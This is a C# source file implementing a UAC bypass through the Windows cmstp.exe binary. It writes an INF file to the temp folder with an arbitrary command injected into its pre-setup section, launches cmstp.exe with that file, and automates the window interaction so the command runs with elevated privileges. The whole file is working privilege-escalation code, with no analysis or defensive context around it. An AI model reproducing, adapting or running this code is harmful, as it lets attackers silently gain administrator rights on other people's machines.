using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
    // Our .INF file template!
    public static string InfTemplate = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string GenerateInfFile(string commandToExecute)
    {
        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string tempDirectory = Path.GetTempPath();
        string outputFile = Path.Combine(tempDirectory, $"{randomFileName}.inf");
        string infContent = InfTemplate.Replace("REPLACE_COMMAND_LINE", commandToExecute);
        File.WriteAllText(outputFile, infContent);
        return outputFile;
    }

    public static bool Execute(string commandToExecute)
    {
        if (!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }

        string infFile = GenerateInfFile(commandToExecute);
        Console.WriteLine("Payload file written to " + infFile);

        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + infFile;
        startInfo.UseShellExecute = false;
        Process process = Process.Start(startInfo);

        process.WaitForInputIdle();
        IntPtr windowHandle = process.MainWindowHandle;
        SetForegroundWindow(windowHandle);
        ShowWindow(windowHandle, 5);

        using (StreamWriter writer = process.StandardInput)
        {
            if (writer != null)
            {
                writer.WriteLine();
            }
        }

        return true;
    }
}
